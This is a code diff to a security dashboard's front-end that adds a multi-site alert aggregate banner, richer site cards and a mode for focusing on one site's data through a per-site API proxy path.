+      <span class="sfb-label" id="sfbSiteName"></span>
+    </div>
+
     <!-- ==================== SITES TAB ==================== -->
     <div class="tab-pane" id="tab-sites">
       <div class="card">
@@ -4123,6 +4690,8 @@ select { cursor: pointer; }
 
     <!-- ==================== OVERVIEW TAB ==================== -->
     <div class="tab-pane active" id="tab-overview">
+      <!-- Cross-site aggregate banner (Phase 18 M1 — hidden when no nodes configured) -->
+      <div class="sites-aggregate" id="overview-agg-banner" style="display:none" onclick="switchTab('sites')"></div>
       <!-- Alert Summary -->
       <div class="card">
         <div class="card-header-sticky" style="display:flex;align-items:center;gap:4px">
@@ -4462,7 +5031,7 @@ function loadTabData(tabId) {
   _tabLoaded[tabId] = true;
   switch(tabId) {
     case 'sites': loadSites(); break;
-    case 'overview': loadSummary(); loadTimeline(); loadDetections(); break;
+    case 'overview': loadSummary(); loadTimeline(); loadDetections(); loadOverviewAggregate(); break;
     case 'fleet': loadFleet(); break;
     case 'data': loadEvents(); break;
     case 'detections': loadRules(); break;
@@ -4513,36 +5082,108 @@ async function fetchJSON(path) {
   }
 }
 
-// ── Sites tab ──
+// ── Sites tab (Phase 18 M1 — enriched with operational data) ──
 let _sitesVisible = false;
+let _sitesCache = null;  // cached /api/nodes response for aggregate banner
+let _focusedSite = null; // Phase 18 M3: currently focused site node_id (null = all-sites view)
 
 async function loadSites() {
   const grid = document.getElementById('sitesGrid');
   const countEl = document.getElementById('sitesCount');
   const d = await fetchJSON('/api/nodes');
+  _sitesCache = d;  // cache for aggregate banner
   if (d.error && !d.nodes) { grid.innerHTML = '<div class="empty">' + escapeHtml(d.error) + '</div>'; return; }
   const nodes = d.nodes || [];
   countEl.textContent = nodes.length + ' site' + (nodes.length !== 1 ? 's' : '');
   if (!nodes.length) { grid.innerHTML = '<div class="empty">No remote sites configured</div>'; return; }
+
+  // Sort: critical alerts first, then total alerts desc, then alphabetically
+  nodes.sort(function(a, b) {
+    const ac = a.alerts_critical || 0, bc = b.alerts_critical || 0;
+    if (ac !== bc) return bc - ac;
+    const at = a.alerts_24h || 0, bt = b.alerts_24h || 0;
+    if (at !== bt) return bt - at;
+    return (a.node_id || '').localeCompare(b.node_id || '');
+  });
+
+  // Build aggregate banner
   let html = '';
+  const agg = d.aggregate;
+  if (agg) {
+    html += '<div class="sites-aggregate" onclick="switchTab(\\'overview\\')">';
+    html += '<span class="agg-val">' + nodes.length + ' site' + (nodes.length !== 1 ? 's' : '') + '</span>';
+    html += '<span class="agg-sep">&middot;</span>';
+    html += '<span class="agg-val">' + (agg.total_alerts_24h || 0) + ' alerts</span>';
+    if (agg.total_critical > 0) {
+      html += '<span class="agg-sep">&middot;</span>';
+      html += '<span class="agg-crit">' + agg.total_critical + ' critical</span>';
+    }
+    if (agg.total_high > 0) {
+      html += '<span class="agg-sep">&middot;</span>';
+      html += '<span style="color:#e67e22;font-weight:600">' + agg.total_high + ' high</span>';
+    }
+    html += '<span class="agg-sep">&middot;</span>';
+    html += '<span class="agg-val">' + (agg.total_hosts || 0) + ' hosts</span>';
+    if (agg.sites_unreachable > 0) {
+      html += '<span class="agg-sep">&middot;</span>';
+      html += '<span style="color:#ef4444;font-weight:600">' + agg.sites_unreachable + ' unreachable</span>';
+    }
+    html += '</div>';
+  }
+
+  // Build site cards
   for (const n of nodes) {
     const statusCls = n.status || 'unreachable';
     const statusLabel = statusCls.charAt(0).toUpperCase() + statusCls.slice(1);
     const anchorAgo = n.last_anchor_at ? timeAgo(n.last_anchor_at) : 'never';
+    const hasCritical = (n.alerts_critical || 0) > 0;
+    const hasHigh = (n.alerts_high || 0) > 0;
+    const alertCount = n.alerts_24h;
+    const badgeCls = alertCount === null ? 'none' : hasCritical ? 'crit' : hasHigh ? 'high' : 'none';
+    const badgeVal = alertCount !== null ? alertCount : '—';
     const versionBadge = n.version && n.version !== nodes[0].version
       ? ' <span class="badge badge-medium">outdated</span>' : '';
-    html += '<div class="site-card">'
-      + '<div class="site-card-header">'
-      + '<span class="site-status ' + statusCls + '"></span>'
-      + '<strong>' + escapeHtml(n.node_id || n.url) + '</strong>'
-      + '</div>'
-      + '<div class="site-metrics">'
-      + '<div class="site-metric"><span>Status</span><span class="val">' + statusLabel + '</span></div>'
-      + '<div class="site-metric"><span>Version</span><span class="val">' + escapeHtml(n.version || '?') + versionBadge + '</span></div>'
-      + '<div class="site-metric"><span>Ledger seq</span><span class="val">' + (n.ledger_sequence ?? '—') + '</span></div>'
-      + '<div class="site-metric"><span>Last anchor</span><span class="val">' + anchorAgo + '</span></div>'
-      + '<div class="site-metric"><span>Detections (last run)</span><span class="val">' + (n.last_anchor_items ?? '—') + '</span></div>'
-      + '</div>';
+
+    html += '<div class="site-card' + (hasCritical ? ' has-critical' : '') + '" onclick="focusSite(\\'' + escapeHtml(n.node_id || '') + '\\')">';
+    html += '<div class="site-card-header">';
+    html += '<span class="site-status ' + statusCls + '"></span>';
+    html += '<strong>' + escapeHtml(n.node_id || n.url) + '</strong>';
+    html += '<span class="site-alert-badge ' + badgeCls + '">' + badgeVal + '</span>';
+    html += '</div>';
+
+    // Operational data
+    html += '<div class="site-ops">';
+    if (alertCount !== null) {
+      // Severity breakdown line
+      let sevParts = [];
+      if (n.alerts_critical > 0) sevParts.push('<span class="sev-crit">' + n.alerts_critical + ' critical</span>');
+      if (n.alerts_high > 0) sevParts.push('<span class="sev-high">' + n.alerts_high + ' high</span>');
+      const otherCount = alertCount - (n.alerts_critical || 0) - (n.alerts_high || 0);
+      if (otherCount > 0) sevParts.push('<span>' + otherCount + ' other</span>');
+      if (sevParts.length > 0) {
+        html += '<div class="sev-line">' + sevParts.join(' &middot; ') + '</div>';
+      } else {
+        html += '<div style="color:var(--green)">No alerts</div>';
+      }
+    } else {
+      html += '<div>Alerts: —</div>';
+    }
+    if (n.host_count !== null) {
+      html += '<div>' + n.host_count + ' host' + (n.host_count !== 1 ? 's' : '');
+      if (n.total_events_24h !== null) html += ' &middot; ' + (n.total_events_24h || 0).toLocaleString() + ' events (24h)';
+      html += '</div>';
+    }
+    if (n.top_rule) html += '<div>Top rule: <strong>' + escapeHtml(n.top_rule) + '</strong></div>';
+    html += '</div>';
+
+    // Infrastructure metrics
+    html += '<div class="site-metrics">';
+    html += '<div class="site-metric"><span>Status</span><span class="val">' + statusLabel + '</span></div>';
+    html += '<div class="site-metric"><span>Version</span><span class="val">' + escapeHtml(n.version || '?') + versionBadge + '</span></div>';
+    html += '<div class="site-metric"><span>Ledger seq</span><span class="val">' + (n.ledger_sequence ?? '—') + '</span></div>';
+    html += '<div class="site-metric"><span>Last anchor</span><span class="val">' + anchorAgo + '</span></div>';
+    html += '</div>';
+
     if (!n.reachable && n.error) {
       html += '<div class="site-error">' + escapeHtml(n.error) + '</div>';
     }
@@ -4551,9 +5192,79 @@ async function loadSites() {
   grid.innerHTML = html;
 }
 
+function apiBase() {
+  // Phase 18 M3: returns the API base path for data queries.
+  // In focused mode, routes through the site proxy; otherwise uses local API.
+  return _focusedSite ? '/api/site/' + encodeURIComponent(_focusedSite) : '/api';
+}
+
+function focusSite(nodeId) {
+  if (_focusedSite === nodeId) return;  // already focused
+  _focusedSite = nodeId;
+  try { sessionStorage.setItem('tinysocs_focused_site', nodeId); } catch(e) {}
+  // Show the site focus banner
+  const banner = document.getElementById('siteFocusBanner');
+  if (banner) { banner.classList.add('visible'); }
+  const label = document.getElementById('sfbSiteName');
+  if (label) { label.textContent = 'Viewing: ' + nodeId; }
+  // Hide the overview aggregate banner (we're viewing one site, not all)
+  const aggBanner = document.getElementById('overview-agg-banner');
+  if (aggBanner) aggBanner.style.display = 'none';
+  // Reset tab data cache so widgets re-fetch from the focused site
+  _tabLoaded = {};
+  switchTab('overview');
+}
+
+function unfocusSite() {
+  _focusedSite = null;
+  try { sessionStorage.removeItem('tinysocs_focused_site'); } catch(e) {}
+  // Hide the site focus banner
+  const banner = document.getElementById('siteFocusBanner');
+  if (banner) { banner.classList.remove('visible'); }
+  // Reset tab data cache
+  _tabLoaded = {};
+  switchTab('sites');
+}
+
+async function loadOverviewAggregate() {
+  // Show cross-site aggregate banner on the Overview tab
+  const banner = document.getElementById('overview-agg-banner');
+  if (!banner) return;
+  if (!_sitesVisible) { banner.style.display = 'none'; return; }
+
+  // Use cached data from Sites tab if available, otherwise fetch
+  const d = _sitesCache || await fetchJSON('/api/nodes');
+  if (!_sitesCache) _sitesCache = d;
+  const agg = d.aggregate;
+  const nodes = d.nodes || [];
+  if (!agg || !nodes.length) { banner.style.display = 'none'; return; }
+
+  let html = '';
+  html += '<span class="agg-val">' + nodes.length + ' site' + (nodes.length !== 1 ? 's' : '') + '</span>';
+  html += '<span class="agg-sep">&middot;</span>';
+  html += '<span class="agg-val">' + (agg.total_alerts_24h || 0) + ' alerts</span>';
+  if (agg.total_critical > 0) {
+    html += '<span class="agg-sep">&middot;</span>';
+    html += '<span class="agg-crit">' + agg.total_critical + ' critical</span>';
+  }
+  if (agg.total_high > 0) {
+    html += '<span class="agg-sep">&middot;</span>';
+    html += '<span style="color:#e67e22;font-weight:600">' + agg.total_high + ' high</span>';
+  }
+  html += '<span class="agg-sep">&middot;</span>';
+  html += '<span class="agg-val">' + (agg.total_hosts || 0) + ' hosts</span>';
+  if (agg.sites_unreachable > 0) {
+    html += '<span class="agg-sep">&middot;</span>';
+    html += '<span style="color:#ef4444;font-weight:600">' + agg.sites_unreachable + ' unreachable</span>';
+  }
+  banner.innerHTML = html;
+  banner.style.display = '';
+}
+
 async function initSitesTab() {
   // Check if Sites tab should be visible (multi-node or demo mode)
   const d = await fetchJSON('/api/nodes');
+  _sitesCache = d;  // cache for aggregate banner
   const nodes = d.nodes || [];
   const btn = document.getElementById('sitesTabBtn');
   if (nodes.length > 0) {
@@ -4568,7 +5279,7 @@ async function initSitesTab() {
 
 async function loadSummary() {
   const el = document.getElementById('summary-content');
-  const d = await fetchJSON(`/api/alerts/summary?hours=${hours}`);
+  const d = await fetchJSON(`${apiBase()}/alerts/summary?hours=${hours}`);
   if (d.error && !d.severity) { el.innerHTML = `<div class="empty">${d.error}</div>`; return; }
 
   const total = d.total || 0;
@@ -4596,7 +5307,7 @@ const SEV_ORDER = ['critical','high','medium','low','info'];
 
 async function loadTimeline() {
   const el = document.getElementById('timeline-content');
-  const d = await fetchJSON(`/api/alerts/timeline?hours=${hours}`);
+  const d = await fetchJSON(`${apiBase()}/alerts/timeline?hours=${hours}`);
   if (d.error && !d.buckets?.length) { el.innerHTML = `<div class="empty">${d.error}</div>`; return; }
 
   const buckets = d.buckets || [];
@@ -4740,7 +5451,7 @@ const _DETECTIONS_PER_PAGE = 10;
 
 async function loadDetections() {
   const el = document.getElementById('detections-content');
-  const d = await fetchJSON(`/api/detections/fired?hours=${hours}&limit=50`);
+  const d = await fetchJSON(`${apiBase()}/detections/fired?hours=${hours}&limit=50`);
   if (d.error && !d.detections?.length) { el.innerHTML = `<div class="empty">${d.error}</div>`; return; }
   _detectionCache = d.detections || [];
   renderDetections();
@@ -5070,7 +5781,7 @@ let _threatIntelStatus = null;
 
 async function loadFleet() {
   const el = document.getElementById('fleet-content');
-  const d = await fetchJSON('/api/fleet/health');
+  const d = await fetchJSON(apiBase() + '/fleet/health');
   if (d.error && !d.hosts?.length) { el.innerHTML = `<div class="empty">${d.error}</div>`; return; }
   _fleetCache = d.hosts || [];
   // Fetch version status for drift badges and banner
@@ -5393,7 +6104,7 @@ async function loadEvents(background) {
   const idx = document.getElementById('eventIndex').value;
   const timeRange = document.getElementById('eventTimeRange').value;
   if (!background) el.innerHTML = '<div class="loading">Loading...</div>';
-  let url = `/api/events/recent?limit=200&index=${encodeURIComponent(idx)}&q=${encodeURIComponent(q)}`;
+  let url = `${apiBase()}/events/recent?limit=200&index=${encodeURIComponent(idx)}&q=${encodeURIComponent(q)}`;
   if (timeRange) url += `&time_range=${encodeURIComponent(timeRange)}`;
   const d = await fetchJSON(url);
   if (d.error && !d.events?.length) { el.innerHTML = `<div class="empty">${d.error}</div>`; return; }
@@ -5608,7 +6319,7 @@ async function refreshHostTimeline() {
   el.innerHTML = '<div class="loading">Loading...</div>';
   legendEl.innerHTML = '';
 
-  const d = await fetchJSON(`/api/host/timeline?hostname=${encodeURIComponent(_hostTimelineHost)}&hours=${hrs}`);
+  const d = await fetchJSON(`${apiBase()}/host/timeline?hostname=${encodeURIComponent(_hostTimelineHost)}&hours=${hrs}`);
   if (d.error && !d.buckets?.length) { el.innerHTML = `<div class="empty">${d.error}</div>`; return; }
 
   const buckets = d.buckets || [];
@@ -5977,6 +6688,7 @@ function refreshAll() {
       break;
     case 'overview':
       tasks.push(loadSummary(), loadTimeline(), loadDetections());
+      if (_sitesVisible) { _sitesCache = null; tasks.push(loadOverviewAggregate()); }
       break;
     case 'fleet':
       tasks.push(loadFleet());
@@ -6560,6 +7272,21 @@ function unlockDashboard() {
 
   // Check if Sites tab should be shown (async — may update default tab)
   try { initSitesTab(); } catch(e) {}
+
+  // Phase 18 M3: restore focused site from sessionStorage
+  try {
+    var storedSite = sessionStorage.getItem('tinysocs_focused_site');
+    if (storedSite) {
+      _focusedSite = storedSite;
+      var banner = document.getElementById('siteFocusBanner');
+      if (banner) banner.classList.add('visible');
+      var label = document.getElementById('sfbSiteName');
+      if (label) label.textContent = 'Viewing: ' + storedSite;
+      // Re-switch to the current tab to load site-specific data
+      _tabLoaded = {};
+      switchTab(tab);
+    }
+  } catch(e) {}
 }
 
 // Periodic data refresh (every 30s once unlocked)
